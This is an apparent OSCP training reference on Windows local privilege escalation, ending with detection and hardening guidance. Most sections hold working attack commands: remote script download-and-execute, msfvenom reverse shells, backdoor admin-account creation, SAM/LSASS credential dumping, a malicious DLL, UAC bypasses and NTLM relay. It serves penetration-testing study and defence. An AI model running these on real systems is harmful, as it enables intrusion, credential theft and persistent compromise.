# Windows Local Privilege Escalation — Complete Attack Reference

**Track:** Mastering OSCP
**Section:** Privilege Escalation — 024
**Topics:** Kernel Exploits, Access Token Manipulation, The Potato Family, UAC Bypass, DLL Hijacking, Service Exploitation, Scheduled Tasks, Registry Abuse, COM/DCOM Hijacking, Credential Hunting, Named Pipes, Privilege Abuse Reference, Persistence Triggers, WMI/BITS/WSL, Detection & Hardening

---

## 1. Foundational Concepts

**Local Privilege Escalation (LPE)** is the process of going from a low-privileged shell — a regular user, a service account, a network-authenticated user — to `NT AUTHORITY\SYSTEM`, Local Administrator, or a high-integrity process, without any further network-side interaction. Microsoft's own terminology for the same concept is **EoP** (Elevation of Privilege).

### 1.1 Terminology

| Term | Meaning |
|---|---|
| **LPE** | Local Privilege Escalation — going from low to high privileges |
| **EoP** | Elevation of Privilege — Microsoft's term for the same concept |
| **NT AUTHORITY\SYSTEM** | The highest Windows account — equivalent to ring-0 context |
| **High Integrity** | An elevated process (UAC already satisfied) |
| **Medium Integrity** | A standard, non-admin process |
| **Low Integrity** | Sandboxed/restricted processes (IE Protected Mode, AppContainer) |
| **Token** | A kernel object representing a process's security context |
| **PAC** | Privilege Attribute Certificate — Kerberos authorization data |

### 1.2 Integrity Levels

```
System    (0x4000) — NT AUTHORITY\SYSTEM
High      (0x3000) — Elevated administrator (UAC approved)
Medium    (0x2000) — Standard user (default even for local admins when UAC is on)
Low       (0x1000) — Sandboxed / AppContainer
Untrusted (0x0000) — Lowest level, used for anonymous sessions
```

---

## 2. Enumeration Toolkit

### 2.1 Automated Enumeration Tools

| Tool | Platform | Command | Source |
|---|---|---|---|
| **winPEAS** | Windows | `winPEASx64.exe` | PEASS-ng |
| **PowerUp** | Windows/PS | `Invoke-AllChecks` | PowerSploit |
| **SharpUp** | Windows | `SharpUp.exe audit` | GhostPack |
| **Seatbelt** | Windows | `Seatbelt.exe -group=all` | GhostPack |
| **Watson** | Windows | `Watson.exe` | rasta-mouse |
| **wesng** | Linux | `python3 wesng.py systeminfo.txt` | bitsadmin |
| **BeRoot** | Windows | `beRoot.exe` | AlessandroZ |
| **JAWS** | PowerShell | `.\jaws-enum.ps1` | 411Hall |
| **PrivescCheck** | PowerShell | `Invoke-PrivescCheck` | itm4n |

### 2.2 Manual Enumeration Kickstart

```powershell
# System / OS information
systeminfo
[System.Environment]::OSVersion.Version
Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber

# Current user context
whoami /all
whoami /priv
whoami /groups

# Local users and groups
net user
net localgroup administrators
Get-LocalGroupMember -Group "Administrators"

# Running processes / services
tasklist /v
Get-Process | Select-Object Name, Id, Path
sc query
Get-Service | Where-Object {$_.Status -eq "Running"}

# Installed hotfixes (for kernel exploit identification)
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | Sort-Object InstalledOn -Descending

# Network connections
netstat -ano
Get-NetTCPConnection

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"}

# Environment variables
set
Get-ChildItem Env:
```

---

## 3. Part 1 — Kernel Exploits

A successful kernel exploit gives **unconditional SYSTEM access**, regardless of any other control on the box. They target vulnerabilities in `ntoskrnl.exe`, kernel-mode drivers, or other ring-0 components.

### 3.1 The Kernel Exploit Workflow

1. Enumerate the OS version and build number.
2. Identify missing patches (compare installed KBs against public CVE data).
3. Locate or compile a matching exploit.
4. Execute → elevate to SYSTEM.

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### 3.2 Windows Exploit Suggester (`wesng`)

```bash
# Attacker machine
git clone https://github.com/bitsadmin/wesng
pip3 install wesng

# Victim — generate systeminfo output
systeminfo > C:\Temp\sysinfo.txt
```

```bash
# Attacker machine, after transferring sysinfo.txt
python3 wes.py --update
python3 wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
```

### 3.3 Metasploit Local Exploit Suggester

```
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

### 3.4 Notable Kernel CVEs

| CVE | Type | Notes |
|---|---|---|
| CVE-2021-34527 | **PrintNightmare** | Print Spooler DLL load → SYSTEM. Check `RestrictDriverInstallationToAdministrators`. Exploit via `Invoke-Nightmare` |
| CVE-2021-36934 | **HiveNightmare/SeriousSAM** | SAM/SYSTEM readable via VSS shadow copy by non-admins. `icacls C:\Windows\System32\config\sam` shows `BUILTIN\Users:(I)(RX)` |
| CVE-2022-21882 / CVE-2022-21999 | Win32k UAF | Token theft via kernel use-after-free |
| CVE-2023-21746 | **LocalPotato** | NTLM reflection on Windows Installer → arbitrary file write as SYSTEM, no `SeImpersonatePrivilege` needed |
| CVE-2023-23397 | Outlook EoP | Forces NTLM auth via crafted calendar reminder — capture with Responder |
| CVE-2024-21338 | AppLocker driver (`appid.sys`) | IOCTL abuse manipulates `ETHREAD.PreviousMode` → kernel R/W |
| CVE-2024-38193 | `Afd.sys` (WinSock) UAF | Race condition → SYSTEM token theft |
| CVE-2025-62215 | Kernel race condition (double-free) | Actively exploited; patched via KB5068858/61/60 |
| CVE-2025-62221 | Cloud Files Mini Filter (`cldflt.sys`) UAF | Actively exploited; patched Dec 2025 |

**PrintNightmare exploitation (PowerShell):**

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1')
Invoke-Nightmare -NewUser "hacker" -NewPassword "P@ssw0rd123!" -DriverName "PrintMe"
```

**HiveNightmare exploitation:**

```cmd
vssadmin list shadows
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam C:\Temp\sam
cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system C:\Temp\system
```
```bash
secretsdump.py -sam sam -system system -security security LOCAL
```

---

## 4. Part 2 — Access Token Manipulation

Access tokens are kernel objects defining a process's security context — manipulating them is one of the most powerful LPE primitives on Windows.

### 4.1 Token Anatomy

```
Access Token contains:
├── User SID
├── Group SIDs
├── Privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
├── Integrity Level
├── Session ID
└── Token Type (Primary vs. Impersonation)
```

### 4.2 Token Duplication (`SeDebugPrivilege` / `SeImpersonatePrivilege`)

**Mimikatz:**
```
privilege::debug
token::elevate
token::whoami
```

**Meterpreter:**
```
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid
getsystem
```

### 4.3 Named Pipe Token Impersonation

A named pipe server can call `ImpersonateNamedPipeClient()` after a privileged client connects, stealing that client's token. This is the mechanism underlying every Potato-family exploit (Part 6).

### 4.4 Make Token (`LogonUser` / `runas`)

```cmd
runas /netonly /user:DOMAIN\Administrator "cmd.exe"
```

### 4.5 PPID Spoofing

Spawns a process with a spoofed parent PID to inherit a privileged process's security context, via `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.

### 4.6 Meterpreter `getsystem`

`getsystem` internally rotates through three techniques: named pipe impersonation, token duplication via `AdjustTokenPrivileges`/`SeDebugPrivilege`, and SYSTEM token duplication from `winlogon.exe` handles.

---

## 5. Part 3 — Privilege Abuse Reference Table

Every enabled privilege shown in `whoami /priv` is worth checking against this table — many have a direct, well-documented path to SYSTEM.

| Privilege | Technique | Effect |
|---|---|---|
| `SeImpersonatePrivilege` | Any Potato, PrintSpoofer, GodPotato | SYSTEM via token steal |
| `SeAssignPrimaryTokenPrivilege` | JuicyPotato, token assignment | SYSTEM via primary token |
| `SeDebugPrivilege` | Mimikatz, token duplication from SYSTEM processes | SYSTEM / credential dump |
| `SeBackupPrivilege` | Read any file, including SAM/SYSTEM | Credential dump |
| `SeRestorePrivilege` | Write any file, modify SAM | Code execution as SYSTEM |
| `SeTakeOwnershipPrivilege` | Take ownership of any object | Modify protected files/registry |
| `SeCreateSymbolicLinkPrivilege` | Symlinks redirecting system file writes | Arbitrary file write |
| `SeLoadDriverPrivilege` | Load a malicious/vulnerable kernel driver | Ring-0 / SYSTEM |
| `SeManageVolumePrivilege` | Raw disk access | SAM/SYSTEM dump via shadow copy |
| `SeTcbPrivilege` | Act as part of the trusted computing base | Act as part of the OS |
| `SeCreateTokenPrivilege` | Create arbitrary access tokens | SYSTEM via token creation |
| `SeRelabelPrivilege` | Modify integrity labels | Low→Medium→High escalation |

**`SeBackupPrivilege` in practice** — bypasses normal ACL checks entirely:

```cmd
robocopy /B C:\Windows\System32\config C:\Temp sam system
```
or
```cmd
reg save hklm\sam sam
reg save hklm\system system
```
```bash
secretsdump.py -sam sam -system system LOCAL
```

**`SeLoadDriverPrivilege`** — the classic BYOVD path using the known-vulnerable `Capcom.sys`:

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\Public\Desktop\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Users\Public\Desktop\Capcom.sys
```
Confirm it loaded, then trigger code execution as SYSTEM through the driver's own exploit binary (`ExploitCapcom.exe`), pointed at a staged reverse shell.

**`SeTakeOwnershipPrivilege`:**

```cmd
takeown /f C:\Windows\System32\SomeCriticalFile.exe
icacls C:\Windows\System32\SomeCriticalFile.exe /grant $env:USERNAME:F
```

---

## 6. Part 4 — The Potato Family (`SeImpersonatePrivilege`)

The "Potato" exploits abuse `SeImpersonatePrivilege` — granted **by default** to IIS application pools, SQL Server, and many other service accounts.

```cmd
whoami /priv
# Look for: SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

### 6.1 Which Potato to Use

```
Have SeImpersonatePrivilege?
  ├── Windows ≥ Server 2019 / Win10 1809?
  │       ├── GodPotato (works on essentially everything current)
  │       ├── SweetPotato (EfsRpc/PrintSpoofer modes)
  │       └── RoguePotato (if outbound TCP is allowed)
  └── Windows < Server 2019?
          └── JuicyPotato (CLSID-based DCOM)
```

### 6.2 Quick Reference

| Tool | Mechanism | Notes |
|---|---|---|
| **Hot Potato** | NBNS spoofing + NTLM relay + autologon | Largely obsolete, patched |
| **Rotten Potato** | Tricks BITS into NTLM-authenticating to a local COM server | Partially patched — use RottenPotatoNG |
| **Juicy Potato** | DCOM activation with a specific CLSID | Pre-2019 only; needs a working CLSID |
| **JuicyPotatoNG** | Same idea, auto-discovers working CLSIDs | Works through Server 2019 |
| **Rogue Potato** | Fake OXID Resolver via port forwarding | For Server 2019+/Win10 1809+ where Juicy fails |
| **PrintSpoofer** | Coerces the Print Spooler into a named pipe connection | Requires Spooler running |
| **Sweet Potato** | Bundles multiple techniques in one tool | RottenPotato/JuicyPotato+BITS/PrintSpoofer/EfsRpc |
| **God Potato** | DCOM + RPC coercion | Works on essentially all current versions |
| **EfsPotato** | EFS RPC interface coercion | Same underlying primitive as PetitPotam |
| **Local Potato** (CVE-2023-21746) | Windows Installer NTLM reflection | Doesn't require `SeImpersonatePrivilege` at all |

**Juicy Potato:**
```cmd
JuicyPotato.exe -l 6666 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Temp\whoami.txt" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

**Rogue Potato (with Chisel for port forwarding):**
```cmd
chisel.exe client 10.10.10.5:8000 R:135:localhost:9999
RoguePotato.exe -r 10.10.10.5 -l 9999 -e "cmd.exe /c whoami > C:\Temp\w.txt"
```

**PrintSpoofer:**
```cmd
PrintSpoofer.exe -i -c "cmd /c whoami"
```

**God Potato:**
```cmd
GodPotato.exe -cmd "cmd /c net user hacker P@ssword123! /add && net localgroup administrators hacker /add"
```

---

## 7. Part 5 — UAC Bypass (T1548.002)

UAC bypass requires the current user to **already be a Local Administrator**, with UAC set to anything other than "Always Notify" — the bypass only silently reaches High Integrity, it doesn't grant new group membership.

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0 = Never notify (no bypass needed) | 2 = Always notify (hardest) | 5 = Default (most bypasses work)
```

### 7.1 Registry Hijack Techniques

| Target Binary | Hijacked Key |
|---|---|
| `fodhelper.exe` | `HKCU\Software\Classes\ms-settings\Shell\Open\command` |
| `eventvwr.exe` | `HKCU\Software\Classes\mscfile\shell\open\command` |
| `sdclt.exe` | `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe` |
| `computerdefaults.exe` | `HKCU\Software\Classes\ms-settings\shell\open\command` |
| `WSReset.exe` | `HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command` |

**Pattern (fodhelper example):**

```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### 7.2 UACMe — 70+ Documented Methods

[UACMe (hfiref0x)](https://github.com/hfiref0x/UACME) packages the entire catalog into one tool:

```cmd
Akagi64.exe 23 C:\Temp\payload.exe   # IFileOperation DLL hijack
Akagi64.exe 70 C:\Temp\payload.exe   # CMSTPLUA (used by LockBit/DarkSide)
```

### 7.3 Other Notable Vectors

- **SilentCleanup** scheduled task — runs `DismHost.exe` from a user-writable AppData path at High Integrity.
- **ICMLuaUtil COM interface** — used by DarkSide, LockBit, TrickBot; also reachable via Metasploit's `bypassuac_comhijack`.
- **DiskCleanup SilentCleanup DLL hijack** — `cleanmgr.exe` auto-elevates and loads DLLs from writable paths.
- **Token impersonation (KONNI technique)** — duplicating an elevated token from an already-elevated process, bypassing UAC at the token level entirely rather than via an auto-elevate binary.

---

## 8. Part 6 — DLL Hijacking & Execution Flow Hijacking (T1574)

### 8.1 DLL Search Order

With `SafeDllSearchMode` on, Windows searches for DLLs in this order:

1. The directory the application was loaded from
2. `C:\Windows\System32`
3. `C:\Windows\System` (16-bit)
4. `C:\Windows`
5. The current working directory
6. Directories in `%PATH%`

**Finding candidates with Procmon:** filter `Result = "NAME NOT FOUND"` and `Path ends with ".dll"`, launch the target app, and check whether any of the missing-DLL search locations are user-writable.

### 8.2 Variants

| Variant | Mechanism |
|---|---|
| **Phantom DLL hijacking** | Target loads a DLL that doesn't exist on disk anywhere — plant it under the expected name (common targets: `wbemcomn.dll`, `version.dll`, various `api-ms-win-*.dll`) |
| **DLL side-loading** | Drop a malicious DLL beside a legitimate signed executable that loads it by name — the signed binary provides cover |
| **Relative path hijacking** | Copy a legitimate exe that loads DLLs relatively into a writable directory, alongside a malicious DLL matching the expected name |
| **PATH hijacking (T1574.007)** | If any `%PATH%` directory is writable, any DLL loaded by name from PATH is hijackable |
| **WinSxS / SxS DotLocal** | Abuses the `.local` redirect directory to override the normal DLL search order |

**Minimal malicious DLL:**

```c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user hacker P@ss123 /add && net localgroup administrators hacker /add");
    }
    return TRUE;
}
// Compile: x86_64-w64-mingw32-gcc -shared -o target.dll payload.c
```

---

## 9. Part 7 — Service Exploitation

### 9.1 Unquoted Service Paths (T1574.009)

An unquoted path containing spaces makes Windows try each partial path in turn. For `C:\Program Files\My App\service.exe`, Windows tries, in order: `C:\Program.exe`, then `C:\Program Files\My.exe`, then finally the real path.

```powershell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -notlike 'C:\Windows*'} | Select-Object Name, PathName, StartMode
```

If a writable location exists earlier in that search chain, drop a payload there and restart the service (or wait for a reboot):

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o "C:\Program Files\My App\Vuln.exe"
sc stop "VulnService"
sc start "VulnService"
```

### 9.2 Weak Service / Binary / Registry Permissions

If the service object's ACL, its binary file, or its registry key under `HKLM\SYSTEM\CurrentControlSet\Services\` is writable by a low-privileged account, the service can be redirected entirely:

```cmd
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc config VulnService binPath= "cmd.exe /c net user hacker P@ss /add && net localgroup administrators hacker /add"
sc stop VulnService && sc start VulnService
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net user hacker P@ss /add" /f
```

### 9.3 Service Accounts With `SeImpersonatePrivilege`

Most Windows service accounts (IIS AppPool, SQL Server, Print Spooler operators) carry `SeImpersonatePrivilege` by default — meaning any Potato exploit from Part 6 applies directly.

---

## 10. Part 8 — Scheduled Tasks & AlwaysInstallElevated

### 10.1 Weak Scheduled Task Permissions

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM|Administrators"} | Select-Object TaskName, TaskPath, @{n="Action";e={$_.Actions.Execute}}
```

If the task's target executable is writable, overwrite it directly.

### 10.2 Creating a New Elevated Task (Admin → High Integrity)

```cmd
schtasks /create /tn "EvilTask" /tr "cmd.exe /c whoami > C:\Temp\out.txt" /sc once /st 00:00 /ru "SYSTEM"
schtasks /run /tn "EvilTask"
```

### 10.3 CVE-2024-49039 — Task Scheduler EoP

Affects Windows 10/11 and Server 2016–2025 prior to the November 2024 patch (CVSS 8.8) — authenticated local users can escalate to SYSTEM via a crafted task XML.

### 10.4 AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Vulnerable if BOTH return 0x1
```

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 11. Part 9 — Registry, COM/DCOM Exploitation

### 11.1 Autorun & Credential Registry Keys

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# Look for: DefaultUserName, DefaultPassword, DefaultDomainName
```

### 11.2 COM Hijacking (T1546.015)

COM objects normally load via `HKLM`, but a matching CLSID under `HKCU` takes precedence — no admin rights required.

```cmd
reg add "HKCU\Software\Classes\CLSID\{TARGET_CLSID}\InprocServer32" /t REG_SZ /d "C:\Temp\evil.dll" /f
reg add "HKCU\Software\Classes\CLSID\{TARGET_CLSID}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
```

`COMThanasia` automates finding hijackable and permissive COM keys.

### 11.3 DCOM Application Abuse

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Temp\whoami.txt", "7")
```

---

## 12. Part 10 — Credential Hunting & Password-Based LPE

| Source | How to Reach It |
|---|---|
| **SAM database** | `reg save HKLM\sam C:\Temp\sam.save` (+ `system`, `security`), then `secretsdump.py -sam ... -system ... LOCAL` |
| **LSASS memory** | `procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp`, or `rundll32.exe comsvcs.dll MiniDump`, or Mimikatz `sekurlsa::logonpasswords`; analyze offline with `pypykatz lsa minidump lsass.dmp` |
| **DPAPI master keys** | `dpapi::masterkey /in:...\Protect\<SID>\<key> /rpc` via Mimikatz — protects browser/Credential Manager secrets |
| **Windows Credential Manager** | `cmdkey /list`, then `runas /savecred /user:WORKGROUP\Administrator "..."` |
| **Unattended install files** | `type C:\Windows\Panther\Unattended.xml`, `C:\unattend.xml`, `sysprep.xml` |
| **GPP passwords** | `findstr /si cpassword \\<DOMAIN>\SYSVOL\*.xml`, decrypt with `Get-GPPPassword.py` (AES key is publicly known) |
| **PowerShell history** | `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| **Sticky Notes / SSH keys / browsers / Wi-Fi** | Sticky Notes SQLite DB, `id_rsa`/`*.pem` files, `lazagne.exe all`, `netsh wlan show profile name="SSID" key=clear` |

---

## 13. Part 11 — Named Pipes & PetitPotam

### 13.1 Named Pipe Client Impersonation

The mechanism underlying every Potato variant: create a named pipe, wait for a SYSTEM process to connect, call `ImpersonateNamedPipeClient()`, then duplicate and use the stolen token to spawn a new process.

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\")
```

### 13.2 PetitPotam (CVE-2021-36942)

Forces a Windows host to authenticate to an attacker-controlled server via the MS-EFSRPC interface — devastating when combined with an NTLM relay targeting LDAP:

```bash
ntlmrelayx.py -t ldap://DC.domain.local --delegate-access
python3 PetitPotam.py -d domain.local -u user -p password 10.10.10.5 10.10.10.10
```

---

## 14. Part 12 — Persistence-Adjacent Escalation Triggers

These abuse things that execute automatically at boot or logon, at SYSTEM or elevated context:

| Trigger | Mechanism |
|---|---|
| **Startup folder** | If `...\Start Menu\Programs\Startup` is writable, a dropped payload executes on next login |
| **Registry autorun keys** | `HKCU\...\Run` (user-space, no admin needed) or `HKLM\...\Run` (system-wide, needs write access) |
| **Port monitor DLLs** | Loaded by the Print Spooler at SYSTEM on boot — `HKLM\SYSTEM\...\Print\Monitors\<name>` |
| **Time providers** | DLL loaded by `W32Time` at SYSTEM — `HKLM\SYSTEM\...\W32Time\TimeProviders\<name>` |
| **WMI event subscriptions** | Execute with SYSTEM privileges whenever their trigger condition fires |
| **BITS jobs** | `bitsadmin` can be scripted to download and auto-execute a payload on job completion |

---

## 15. Part 13 — Additional & Emerging Techniques

- **BYOVD (Bring Your Own Vulnerable Driver):** load a legitimate but vulnerable signed driver (e.g. `RTCore64.sys`, `gdrv.sys`, `iqvw64.sys`) to get kernel-level R/W, then steal and inject a SYSTEM token via `EPROCESS` manipulation.
- **Shadow COM hijacking:** abuses the `TreatAs` registry key to redirect COM object instantiation to an attacker-controlled CLSID.
- **RBCD-based LPE:** in a domain environment with the WebClient service running, relay coerced NTLM auth to LDAP, escalate to a service ticket via Resource-Based Constrained Delegation.
- **Kerberos constrained delegation abuse:** if a service account has delegation rights to a target service, use S4U2Self + S4U2Proxy to impersonate any user against that service.
- **Insecure GUI applications:** SYSTEM-owned GUI apps exposing a File → Open/Save dialog can be walked to `C:\Windows\System32` and used to spawn a command window in older Windows versions.
- **Writable PATH directories:** planting a payload that shadows a legitimate command name (e.g. `net.exe`) inside a writable PATH directory.
- **WSL:** if installed, can execute commands in a distinct context that sometimes bypasses AV/EDR hooks tuned for native Windows processes.

---

## 16. Detection & Hardening

### 16.1 Key Windows Event IDs

| Event ID | Log | Meaning |
|---|---|---|
| 4672 | Security | Special privileges assigned to a new logon |
| 4688 | Security | Process creation |
| 4697 | Security | New service installed |
| 4720 | Security | User account created |
| 4732 | Security | User added to Administrators group |
| 7045 | System | New service installed (incl. kernel drivers) |
| 4798 / 4799 | Security | Local/security group membership enumerated |

### 16.2 Key Sysmon Event IDs

| Event ID | Meaning |
|---|---|
| 1 | Process creation (with full command line) |
| 7 | Image/DLL loaded — for detecting DLL hijacking |
| 10 | Process access — LSASS reads signal credential dumping |
| 13 | Registry value set — COM hijacking, autorun persistence |
| 17 / 18 | Named pipe created / connected — Potato-family activity |

### 16.3 Hardening Checklist

```powershell
# Disable Print Spooler where not needed
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# Disable AlwaysInstallElevated
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f

# Set UAC to Always Notify
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f

# Enable Credential Guard
bcdedit /set hypervisorlaunchtype auto

# Disable the built-in Administrator account
net user Administrator /active:no

# Audit service creation and privilege use
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
```

Also worth deploying: **LAPS** for randomized local administrator passwords, and the **Protected Users** AD group for high-value privileged accounts.
